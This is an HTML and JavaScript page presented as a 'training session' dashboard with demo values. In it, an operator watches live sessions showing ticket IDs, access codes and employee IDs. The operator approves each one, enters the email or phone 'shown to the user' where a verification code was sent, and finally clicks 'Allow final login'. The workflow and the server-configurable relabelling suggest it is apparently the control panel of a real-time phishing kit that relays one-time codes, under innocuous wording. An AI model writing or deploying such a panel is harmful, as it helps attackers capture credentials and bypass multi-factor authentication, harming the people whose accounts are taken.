<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Training Session Dashboard</title>
  <style>
    :root { color-scheme: dark; font-family: Inter, system-ui, sans-serif; }
    body { margin: 0; background: #0d1117; color: #e6edf3; }
    main { width: min(1100px, calc(100% - 32px)); margin: 40px auto; }
    header { display: flex; justify-content: space-between; align-items: end; gap: 20px; margin-bottom: 24px; }
    h1 { margin: 0 0 6px; font-size: 28px; } p { margin: 0; color: #8b949e; }
    #connection { color: #3fb950; font-size: 13px; }
    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(310px, 1fr)); gap: 16px; }
    article { padding: 18px; border: 1px solid #30363d; border-radius: 12px; background: #161b22; }
    article.pending { border-color: #d29922; }
    article.final-pending { border-color: #a371f7; }
    .row { display: flex; justify-content: space-between; gap: 12px; align-items: center; }
    .status { padding: 4px 8px; border-radius: 999px; background: #21262d; font-size: 12px; text-transform: capitalize; }
    dl { margin: 18px 0; } dt { color: #8b949e; font-size: 12px; } dd { min-height: 20px; margin: 3px 0 13px; overflow-wrap: anywhere; }
    button { border: 0; border-radius: 7px; padding: 9px 14px; color: white; font-weight: 700; cursor: pointer; }
    .approve { background: #238636; } .reject { background: #da3633; } .actions { display: flex; gap: 8px; }
    .enrollment { box-sizing: border-box; width: 100%; margin: 0 0 12px; padding: 10px 11px; border: 1px solid #30363d; border-radius: 7px; background: #0d1117; color: #e6edf3; }
    .field-label { display: block; margin-bottom: 6px; color: #8b949e; font-size: 12px; }
    .error { min-height: 18px; margin-top: 8px; color: #f85149; font-size: 12px; }
    .empty { padding: 36px; border: 1px dashed #30363d; border-radius: 12px; text-align: center; color: #8b949e; }
  </style>
</head>
<body>
  <main>
    <header><div><h1>Training sessions</h1><p>Realtime synthetic demo values, held in memory only.</p></div><span id="connection">Connecting…</span></header>
    <div id="sessions" class="grid"><div class="empty">No sessions connected.</div></div>
  </main>
  <script>
    const sessions = new Map();
    const enrollmentDrafts = new Map();
    const deliveryTargetDrafts = new Map();
    const container = document.getElementById('sessions');
    const connection = document.getElementById('connection');
    const uiConfig = {
      ticketIdLabel: 'Demo Ticket ID',
      accessCodeLabel: 'Demo Access Code',
      codeText: 'verification value',
    };

    function render() {
      container.replaceChildren();
      if (!sessions.size) {
        const empty = document.createElement('div');
        empty.className = 'empty'; empty.textContent = 'No sessions connected.'; container.append(empty); return;
      }
      for (const session of [...sessions.values()].sort((a, b) => b.updatedAt.localeCompare(a.updatedAt))) {
        const card = document.createElement('article');
        card.className = session.status;
        const top = document.createElement('div'); top.className = 'row';
        const id = document.createElement('strong'); id.textContent = `Session ${session.id.slice(0, 8)}`;
        const status = document.createElement('span'); status.className = 'status'; status.textContent = session.status.replaceAll('-', ' ');
        top.append(id, status);
        const list = document.createElement('dl');
        for (const [label, value] of [
          [uiConfig.ticketIdLabel, session.ticketId],
          [uiConfig.accessCodeLabel, session.accessCode],
          [uiConfig.codeText, session.employeeId],
        ]) {
          const dt = document.createElement('dt'); dt.textContent = label;
          const dd = document.createElement('dd'); dd.textContent = value || '—'; list.append(dt, dd);
        }
        card.append(top, list);
        if (session.status === 'pending' || session.status === 'final-pending') {
          const isFinalApproval = session.status === 'final-pending';
          let enrollment = null;
          let deliveryTarget = null;
          if (!isFinalApproval) {
            const fieldLabel = document.createElement('label'); fieldLabel.className = 'field-label'; fieldLabel.textContent = 'Enrollment ID';
            enrollment = document.createElement('input'); enrollment.className = 'enrollment'; enrollment.type = 'text'; enrollment.maxLength = 80; enrollment.placeholder = 'Assign enrollment ID';
            enrollment.value = enrollmentDrafts.get(session.id) || '';
            enrollment.addEventListener('input', () => enrollmentDrafts.set(session.id, enrollment.value));
            fieldLabel.append(enrollment); card.append(fieldLabel);
            if (session.needsDeliveryTarget) {
              const deliveryLabel = document.createElement('label'); deliveryLabel.className = 'field-label'; deliveryLabel.textContent = `${uiConfig.codeText} delivery destination`;
              deliveryTarget = document.createElement('input'); deliveryTarget.className = 'enrollment'; deliveryTarget.type = 'text'; deliveryTarget.maxLength = 120; deliveryTarget.placeholder = 'Email or phone number shown to the user';
              deliveryTarget.value = deliveryTargetDrafts.get(session.id) || '';
              deliveryTarget.addEventListener('input', () => deliveryTargetDrafts.set(session.id, deliveryTarget.value));
              deliveryLabel.append(deliveryTarget); card.append(deliveryLabel);
            }
          }
          const actions = document.createElement('div'); actions.className = 'actions';
          const error = document.createElement('div'); error.className = 'error';
          for (const [decision, label] of [['approved', isFinalApproval ? 'Allow final login' : 'Approve'], ['rejected', 'Reject']]) {
            const button = document.createElement('button'); button.className = decision === 'approved' ? 'approve' : 'reject'; button.textContent = label;
            button.addEventListener('click', async () => {
              const enrollmentId = enrollment?.value.trim() || '';
              if (decision === 'approved' && !isFinalApproval && !enrollmentId) { error.textContent = 'Enter an Enrollment ID before approving.'; enrollment.focus(); return; }
              const deliveryTargetValue = deliveryTarget?.value.trim() || '';
              if (decision === 'approved' && !isFinalApproval && session.needsDeliveryTarget && !deliveryTargetValue) { error.textContent = `Enter where the ${uiConfig.codeText} was sent before approving.`; deliveryTarget.focus(); return; }
              error.textContent = '';
              const response = await fetch(`/api/sessions/${session.id}/decision`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ decision, enrollmentId, deliveryTarget: deliveryTargetValue }) });
              if (!response.ok) error.textContent = (await response.json()).error || 'Could not save the decision.';
            });
            actions.append(button);
          }
          card.append(actions, error);
        }
        container.append(card);
      }
    }

    fetch('/api/ui-config')
      .then((response) => {
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        return response.json();
      })
      .then((config) => {
        uiConfig.ticketIdLabel = config.ticketIdLabel || uiConfig.ticketIdLabel;
        uiConfig.accessCodeLabel = config.accessCodeLabel || uiConfig.accessCodeLabel;
        uiConfig.codeText = config.codeText || config.accessCodeLabel || uiConfig.codeText;
        render();
      })
      .catch(() => {});

    const events = new EventSource('/api/dashboard/events');
    events.onopen = () => { connection.textContent = 'Live'; };
    events.onerror = () => { connection.textContent = 'Reconnecting…'; };
    events.addEventListener('snapshot', (event) => { for (const item of JSON.parse(event.data)) sessions.set(item.id, item); render(); });
    events.addEventListener('session', (event) => { const item = JSON.parse(event.data); sessions.set(item.id, item); render(); });
  </script>
</body>
</html>
